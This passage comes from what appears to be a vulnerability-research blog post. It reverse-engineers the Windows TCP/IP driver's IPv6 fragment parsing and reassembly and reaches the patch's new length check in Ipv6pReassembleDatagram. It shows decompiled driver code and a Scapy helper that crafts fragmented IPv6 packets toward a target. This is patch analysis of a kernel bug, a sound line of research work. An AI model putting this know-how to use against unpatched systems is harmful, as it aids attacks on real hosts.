<span class="k">if</span> <span class="p">(</span> <span class="n">Protocol</span> <span class="o">==</span> <span class="p">(</span><span class="n">Protocol_t</span> <span class="o">*</span><span class="p">)</span><span class="n">Ipv4Global</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// ...</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
    <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NextHeader</span> <span class="o">=</span> <span class="n">IpHdr</span><span class="o">-&gt;</span><span class="n">next_header</span><span class="p">;</span>
    <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NextHeaderPosition</span> <span class="o">=</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">,</span> <span class="n">next_header</span><span class="p">);</span>
    <span class="n">SrcAddrOffset</span> <span class="o">=</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>


<p>The function does a lot more; it initializes several <code>Packet_t</code> fields but let's ignore that for now to avoid getting overwhelmed by complexity. Once the function returns back in <code>IppReceiveHeaderBatch</code>, it extracts a demuxer off the <code>Protocol_t</code> structure and invokes a parsing callback if the <code>NextHeader</code> is a valid extension header. The <code>Protocol_t</code> structure holds an array of <code>Demuxer_t</code> (term used in the driver).</p>
<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">Demuxer_t</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="n">Parse</span><span class="p">)(</span><span class="n">Packet_t</span> <span class="o">*</span><span class="p">);</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">f0</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">f1</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">Size</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">f3</span><span class="p">;</span>
  <span class="n">_BYTE</span> <span class="n">IsExtensionHeader</span><span class="p">;</span>
  <span class="n">_BYTE</span> <span class="n">gap</span><span class="p">[</span><span class="mi">23</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">Protocol_t</span>
<span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">Demuxer_t</span> <span class="n">Demuxers</span><span class="p">[</span><span class="mi">277</span><span class="p">];</span>
<span class="p">};</span>
</code></pre></div>


<p><code>NextHeader</code> (populated earlier in <code>IppReceiveHeaderBatch</code>) is the value used to index into this array.</p>
<p><center><img alt="ida43" src="/images/reverse_engineering_tcpip/ida4.png"></center></p>
<p>If the demuxer is handling an extension header, then a callback is invoked to parse the header properly. This happens in a loop until the parsing hits the first part of the packet that isn't a header in which case it handles the next packet.</p>
<div class="highlight"><pre><span></span><code><span class="k">while</span> <span class="p">(</span> <span class="p">...</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">NetBufferList</span> <span class="o">=</span> <span class="n">RcvList</span><span class="o">-&gt;</span><span class="n">NetBufferList</span><span class="p">;</span>
    <span class="n">IpProto</span> <span class="o">=</span> <span class="n">RcvList</span><span class="o">-&gt;</span><span class="n">NextHeader</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">...</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Demuxer</span> <span class="o">=</span> <span class="p">(</span><span class="n">Demuxer_t</span> <span class="o">*</span><span class="p">)</span><span class="n">IpUdpEspDemux</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">Demuxer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Protocol</span><span class="o">-&gt;</span><span class="n">Demuxers</span><span class="p">[</span><span class="n">IpProto</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">Demuxer</span><span class="o">-&gt;</span><span class="n">IsExtensionHeader</span> <span class="p">)</span>
        <span class="n">Demuxer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">Demuxer</span> <span class="p">)</span>
        <span class="n">Demuxer</span><span class="o">-&gt;</span><span class="n">Parse</span><span class="p">(</span><span class="n">RcvList</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">RcvList</span> <span class="o">=</span> <span class="n">RcvList</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<p>Makes sense - that's kinda how we would implement parsing of IPv6 packets as well right?</p>
<p><center><img alt="ida1" src="/images/reverse_engineering_tcpip/ida1.png"></center></p>
<p>It is easy to dump the demuxers and their associated <code>NextHeader</code> / <code>Parse</code> values; these might come handy later.</p>
<div class="highlight"><pre><span></span><code>- nh = 0  -&gt; Ipv6pReceiveHopByHopOptions
- nh = 43 -&gt; Ipv6pReceiveRoutingHeader
- nh = 44 -&gt; Ipv6pReceiveFragmentList
- nh = 60 -&gt; Ipv6pReceiveDestinationOptions
</code></pre></div>


<p>Demuxer can expose a callback routine for parsing which I called <code>Parse</code>. The <code>Parse</code> method receives a <code>Packet</code> and it is free to update its state; for example to grab the <code>NextHeader</code> that is needed to know how to parse the next layer. This is what <code>Ipv6pReceiveFragmentList</code> looks like (<code>Ipv6FragmentDemux.Parse</code>):</p>
<p><center><img alt="ida1" src="/images/reverse_engineering_tcpip/ida2.png"></center></p>
<p>It makes sure the next header is <code>IPPROTO_FRAGMENT</code> before going further. Again, makes sense.</p>
<h4 id="the-mechanics-of-ipv6-fragmentation">The mechanics of IPv6 fragmentation</h4>
<p>Now that we understand the overall flow a bit more, it is a good time to start thinking about fragmentation. We know we need to send fragmented packets to hit the code that was fixed by the update, which we know is important somehow. The function that parses fragments is <code>Ipv6pReceiveFragment</code> and it is hairy. Again, keeping track of fragments probably warrants that, so nothing unexpected here.</p>
<p>It's also the right time for us to read literature about how exactly IPv6 fragmentation works. Concepts have been useful until now, but at this point we need to understand the nitty-gritty details. I don't want to spend too much time on this as there is tons of content online discussing the subject so I'll just give you the fast version. To define a fragment, you need to add a fragmentation header which is called <code>IPv6ExtHdrFragment</code> in Scapy land:</p>
<div class="highlight"><pre><span></span><code><span class="k">class</span> <span class="nc">IPv6ExtHdrFragment</span><span class="p">(</span><span class="n">_IPv6ExtHdr</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;IPv6 Extension Header - Fragmentation header&quot;</span>
    <span class="n">fields_desc</span> <span class="o">=</span> <span class="p">[</span><span class="n">ByteEnumField</span><span class="p">(</span><span class="s2">&quot;nh&quot;</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="n">ipv6nh</span><span class="p">),</span>
                   <span class="n">BitField</span><span class="p">(</span><span class="s2">&quot;res1&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span>
                   <span class="n">BitField</span><span class="p">(</span><span class="s2">&quot;offset&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">13</span><span class="p">),</span>
                   <span class="n">BitField</span><span class="p">(</span><span class="s2">&quot;res2&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span>
                   <span class="n">BitField</span><span class="p">(</span><span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
                   <span class="n">IntField</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)]</span>
    <span class="n">overload_fields</span> <span class="o">=</span> <span class="p">{</span><span class="n">IPv6</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;nh&quot;</span><span class="p">:</span> <span class="mi">44</span><span class="p">}}</span>
</code></pre></div>


<p>The most important fields for us are :</p>
<ul>
<li><code>offset</code> which tells the start offset of where the data that follows this header should be placed in the reassembled packet</li>
<li>the <code>m</code> bit that specifies whether or not this is the latest fragment. </li>
</ul>
<p>Note that the <code>offset</code> field is an amount of 8 bytes blocks; if you set it to 1, it means that your data will be at +8 bytes. If you set it to 2, they'll be at +16 bytes, etc.</p>
<p>Here is a small ghetto IPv6 fragmentation function I wrote to ensure I was understanding things properly. I enjoy learning through practice. (Scapy has <a href="https://github.com/secdev/scapy/blob/33a6a5c3db28cb3c6e64880cef18c672e9526260/scapy/layers/inet6.py#L1124"><code>fragment6</code></a>):</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">frag6</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">frag_id</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">nh</span><span class="p">,</span> <span class="n">frag_size</span> <span class="o">=</span> <span class="mi">1008</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;Ghetto fragmentation.&#39;&#39;&#39;</span>
    <span class="k">assert</span> <span class="p">(</span><span class="n">frag_size</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
    <span class="n">leftover</span> <span class="o">=</span> <span class="nb">bytes</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">frags</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">leftover</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">leftover</span><span class="p">[:</span> <span class="n">frag_size</span><span class="p">]</span>
        <span class="n">leftover</span> <span class="o">=</span> <span class="n">leftover</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">):</span> <span class="p">]</span>
        <span class="n">last_pkt</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">leftover</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
        <span class="c1"># 0 -&gt; No more / 1 -&gt; More</span>
        <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">last_pkt</span> <span class="k">else</span> <span class="mi">1</span>
        <span class="k">assert</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="mi">8191</span>
        <span class="n">pkt</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
            <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="n">target</span><span class="p">)</span> \
            <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="n">m</span> <span class="o">=</span> <span class="n">m</span><span class="p">,</span> <span class="n">nh</span> <span class="o">=</span> <span class="n">nh</span><span class="p">,</span> <span class="nb">id</span> <span class="o">=</span> <span class="n">frag_id</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">)</span> \
            <span class="o">/</span> <span class="n">chunk</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
        <span class="n">frags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">frags</span>
</code></pre></div>


<p>Easy enough. The other important aspect of fragmentation in <a href="https://www.geeksforgeeks.org/ipv6-fragmentation-header/">the</a> <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2225063&amp;seqNum=4">literature</a> is related to IPv6 headers and what is called the <em>unfragmentable</em> part of a packet. Here is how Microsoft describes the unfragmentable part: "This part consists of the IPv6 header, the Hop-by-Hop Options header, the Destination Options header for intermediate destinations, and the Routing header". It also is the part that precedes the fragmentation header. Obviously, if there is an unfragmentable part, there is a fragmentable part. Easy, the fragmentable part is what you are sending behind the fragmentation header. The reassembly process is the process of stitching together the unfragmentable part with the reassembled fragmentable part into one beautiful reassembled packet. Here is a diagram taken from <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2225063&amp;seqNum=4">Understanding the IPv6 Header</a> that sums it up pretty well:</p>
<p><center><img alt="msftpress" src="/images/reverse_engineering_tcpip/msftpress0.png"></center></p>
<p>All of this theoretical information is very useful because we can now look for those details while we reverse-engineer. It is always easier to read code and try to match it against what it is supposed or expected to do.</p>
<h2 id="theory-vs-practice-ipv6preceivefragment">Theory vs practice: Ipv6pReceiveFragment</h2>
<p>At this point, I felt I had accumulated enough new information and it was time for zooming back in into the target. We want to verify that reality works like the literature says it does and by doing we will improve our overall understanding. After studying this code for a while we start to understand the big lines. The function receives a <code>Packet</code> but as this structure is packet specific it is not enough to track the state required to reassemble a packet. This is why another important structure is used for that; I called it <code>Reassembly</code>.</p>
<p>The overall flow is basically broken up in three main parts; again no need for us to understand every single details, let's just understand it conceptually and what/how it tries to achieve its goals:</p>
<ul>
<li>1 - Figure out if the received fragment is part of an already existing <code>Reassembly</code>. According to the literature, we know that network stacks should use the source address, the destination address as well as the fragmentation header's identifier to determine if the current packet is part of a group of fragments. In practice, the function <code>IppReassemblyHashKey</code> hashes those fields together and the resulting hash is used to index into a hash-table that stores <code>Reassembly</code> structures (<code>Ipv6pFragmentLookup</code>):</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">IppReassemblyHashKey</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">Iface</span><span class="p">,</span> <span class="kt">int</span> <span class="n">Identification</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">Pkt</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">//...</span>
  <span class="n">Protocol</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">Iface</span> <span class="o">+</span> <span class="mi">40</span><span class="p">);</span>
  <span class="n">OffsetSrcIp</span> <span class="o">=</span> <span class="mi">12</span><span class="n">i64</span><span class="p">;</span>
  <span class="n">AddressLength</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">Protocol</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="n">i64</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">Protocol</span> <span class="o">!=</span> <span class="n">Ipv4Global</span> <span class="p">)</span>
    <span class="n">OffsetSrcIp</span> <span class="o">=</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
  <span class="n">H</span> <span class="o">=</span> <span class="n">RtlCompute37Hash</span><span class="p">(</span>
        <span class="n">g_37HashSeed</span><span class="p">,</span>
        <span class="n">Pkt</span> <span class="o">+</span> <span class="n">OffsetSrcIp</span><span class="p">,</span>
        <span class="n">AddressLength</span><span class="p">);</span>
  <span class="n">OffsetDstIp</span> <span class="o">=</span> <span class="mi">16</span><span class="n">i64</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">Protocol</span> <span class="o">!=</span> <span class="n">Ipv4Global</span> <span class="p">)</span>
    <span class="n">OffsetDstIp</span> <span class="o">=</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">,</span> <span class="n">dst</span><span class="p">);</span>
  <span class="n">H2</span> <span class="o">=</span> <span class="n">RtlCompute37Hash</span><span class="p">(</span><span class="n">H</span><span class="p">,</span> <span class="n">Pkt</span> <span class="o">+</span> <span class="n">OffsetDstIp</span><span class="p">,</span> <span class="n">AddressLength</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">RtlCompute37Hash</span><span class="p">(</span><span class="n">H2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Identification</span><span class="p">,</span> <span class="mi">4</span><span class="n">i64</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80000000</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">Reassembly_t</span><span class="o">*</span> <span class="nf">Ipv6pFragmentLookup</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">Iface</span><span class="p">,</span> <span class="kt">int</span> <span class="n">Identification</span><span class="p">,</span> <span class="n">ipv6_header_t</span> <span class="o">*</span><span class="n">Pkt</span><span class="p">,</span> <span class="n">KIRQL</span> <span class="o">*</span><span class="n">OldIrql</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Iface</span><span class="p">;</span>
  <span class="n">Context</span><span class="p">.</span><span class="n">Signature</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">HashKey</span> <span class="o">=</span> <span class="n">IppReassemblyHashKey</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">Identification</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">Pkt</span><span class="p">);</span>
  <span class="o">*</span><span class="n">OldIrql</span> <span class="o">=</span> <span class="n">KeAcquireSpinLockRaiseToDpc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Ipp6ReassemblyHashTableLock</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Context</span><span class="p">.</span><span class="n">ChainHead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">CurrentReassembly</span> <span class="o">=</span> <span class="p">(</span><span class="n">Reassembly_t</span> <span class="o">*</span><span class="p">)</span><span class="n">RtlLookupEntryHashTable</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Ipp6ReassemblyHashTable</span><span class="p">,</span> <span class="n">HashKey</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Context</span><span class="p">);</span>
        <span class="p">;</span>
        <span class="n">CurrentReassembly</span> <span class="o">=</span> <span class="p">(</span><span class="n">Reassembly_t</span> <span class="o">*</span><span class="p">)</span><span class="n">RtlGetNextEntryHashTable</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Ipp6ReassemblyHashTable</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Context</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="c1">// If we have walked through all the entries in the hash-table,</span>
    <span class="c1">// then we can just bail.</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">CurrentReassembly</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">// If the current entry matches our iface, pkt id, ip src/dst</span>
    <span class="c1">// then we found a match!</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">CurrentReassembly</span><span class="o">-&gt;</span><span class="n">Iface</span> <span class="o">==</span> <span class="n">Iface</span>
      <span class="o">&amp;&amp;</span> <span class="n">CurrentReassembly</span><span class="o">-&gt;</span><span class="n">Identification</span> <span class="o">==</span> <span class="n">Identification</span>
      <span class="o">&amp;&amp;</span> <span class="n">memcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CurrentReassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">.</span><span class="n">src</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">Pkt</span><span class="o">-&gt;</span><span class="n">src</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
      <span class="o">&amp;&amp;</span> <span class="n">memcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CurrentReassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">.</span><span class="n">dst</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">Pkt</span><span class="o">-&gt;</span><span class="n">dst</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">// ...</span>
  <span class="k">return</span> <span class="n">CurrentReassembly</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<ul>
<li>1.1 - If the fragment doesn't belong to any known group, it needs to be put in a newly created <code>Reassembly</code>. This is what <code>IppCreateInReassemblySet</code> does. It's worth noting that this is a point of interest for a reverse-engineer because this is where the <code>Reassembly</code> object gets allocated and constructed (in <code>IppCreateReassembly</code>). It means we can retrieve its size as well as some more information about some of the fields.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">Reassembly_t</span> <span class="o">*</span><span class="nf">IppCreateInReassemblySet</span><span class="p">(</span>
    <span class="n">PKSPIN_LOCK</span> <span class="n">SpinLock</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">Src</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">Iface</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">Identification</span><span class="p">,</span> <span class="n">KIRQL</span> <span class="n">NewIrql</span>
<span class="p">)</span>
<span class="p">{</span>
  <span class="n">Reassembly_t</span> <span class="o">*</span><span class="n">Reassembly</span> <span class="o">=</span> <span class="n">IppCreateReassembly</span><span class="p">(</span><span class="n">Src</span><span class="p">,</span> <span class="n">Iface</span><span class="p">,</span> <span class="n">Identification</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">Reassembly</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">IppInsertReassembly</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">SpinLock</span><span class="p">,</span> <span class="n">Reassembly</span><span class="p">);</span>
    <span class="n">KeAcquireSpinLockAtDpcLevel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Lock</span><span class="p">);</span>
    <span class="n">KeReleaseSpinLockFromDpcLevel</span><span class="p">(</span><span class="n">SpinLock</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">KeReleaseSpinLock</span><span class="p">(</span><span class="n">SpinLock</span><span class="p">,</span> <span class="n">NewIrql</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">Reassembly</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<p><center><img alt="ida3" src="/images/reverse_engineering_tcpip/ida3.png"></center></p>
<ul>
<li>
<p>2 - Now that we have a <code>Reassembly</code> structure, the main function wants to figure out where the current fragment fits in the overall reassembled packet. The <code>Reassembly</code> keeps track of fragments using various lists. It uses a <code>ContiguousList</code> that chains fragments that will be contiguous in the reassembled packet. <code>IppReassemblyFindLocation</code> is the function that seems to implement the logic to figure out where the current fragment fits.</p>
</li>
<li>
<p>2.1 - If <code>IppReassemblyFindLocation</code> returns a pointer to the start of the <code>ContiguousList</code>, it means that the current packet is the first fragment. This is where the function extracts and keeps track of the unfragmentable part of the packet. It is kept in a pool buffer that is referenced in the <code>Reassembly</code> structure.</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span> <span class="n">ReassemblyLocation</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">ContiguousStartList</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">NextHeader</span> <span class="o">=</span> <span class="n">Fragment</span><span class="o">-&gt;</span><span class="n">nexthdr</span><span class="p">;</span>
  <span class="n">UnfragmentableLength</span> <span class="o">=</span> <span class="n">LOWORD</span><span class="p">(</span><span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NetworkLayerHeaderSize</span><span class="p">)</span> <span class="o">-</span> <span class="mi">48</span><span class="p">;</span>
  <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">UnfragmentableLength</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">UnfragmentableData</span> <span class="o">=</span> <span class="n">ExAllocatePoolWithTagPriority</span><span class="p">(</span>
      <span class="p">(</span><span class="n">POOL_TYPE</span><span class="p">)</span><span class="mi">512</span><span class="p">,</span>
      <span class="n">UnfragmentableLength</span><span class="p">,</span>
      <span class="err">&#39;</span><span class="n">erPI</span><span class="err">&#39;</span><span class="p">,</span>
      <span class="n">LowPoolPriority</span>
    <span class="p">);</span>
    <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableData</span> <span class="o">=</span> <span class="n">UnfragmentableData</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">UnfragmentableData</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// ...</span>
      <span class="k">goto</span> <span class="n">Bail_0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
    <span class="c1">// Copy the unfragmentable part of the packet inside the pool</span>
    <span class="c1">// buffer that we have allocated.</span>
    <span class="n">RtlCopyMdlToBuffer</span><span class="p">(</span>
      <span class="n">FirstNetBuffer</span><span class="o">-&gt;</span><span class="n">MdlChain</span><span class="p">,</span>
      <span class="n">FirstNetBuffer</span><span class="o">-&gt;</span><span class="n">DataOffset</span> <span class="o">-</span> <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NetworkLayerHeaderSize</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span>
      <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableData</span><span class="p">,</span>
      <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableLength</span><span class="p">,</span>
      <span class="n">v51</span><span class="p">);</span>
    <span class="n">NextHeaderOffset</span> <span class="o">=</span> <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NextHeaderPosition</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">NextHeaderOffset</span> <span class="o">=</span> <span class="n">NextHeaderOffset</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Packet</span><span class="o">-&gt;</span><span class="n">Ipv6Hdr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<ul>
<li>3 - The fragment is then added into the <code>Reassembly</code> as part of a group of fragments by <code>IppReassemblyInsertFragment</code>. On top of that, if we have received every fragment necessary to start a reassembly, the function <code>Ipv6pReassembleDatagram</code> is invoked. Remember this guy? This is the function that has been patched and that we hit earlier in the post. But this time, we understand how we got there.</li>
</ul>
<p>At this stage we have an OK understanding of the data structures involved to keep track of groups of fragments and how/when reassembly gets kicked off. We've also commented and refined various structure fields that we lifted early in the process; this is very helpful because now we can understand the fix for the vulnerability:</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">Ipv6pReassembleDatagram</span><span class="p">(</span><span class="n">Packet_t</span> <span class="o">*</span><span class="n">Packet</span><span class="p">,</span> <span class="n">Reassembly_t</span> <span class="o">*</span><span class="n">Reassembly</span><span class="p">,</span> <span class="kt">char</span> <span class="n">OldIrql</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">//...</span>
  <span class="n">UnfragmentableLength</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableLength</span><span class="p">;</span>
  <span class="n">TotalLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">DataLength</span><span class="p">;</span>
  <span class="n">HeaderAndOptionsLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">);</span>
  <span class="c1">// Below is the added code by the patch</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">TotalLength</span> <span class="o">&gt;</span> <span class="mh">0xFFF</span> <span class="p">)</span> <span class="p">{</span>
      <span class="c1">// Bail</span>
  <span class="p">}</span>
</code></pre></div>


<p>How cool is that? That's really rewarding. Putting in a bunch of work that may feel not that useful at the time, but eventually adds up, snow-balls and really moves the needle forward. It's just a slow process and you gotta get used to it; that's just how the sausage is made.</p>
<p>Let's not get ahead of ourselves though, the emotional rollercoaster is right around the corner :)</p>
<h2 id="hiding-in-plain-sight">Hiding in plain sight</h2>
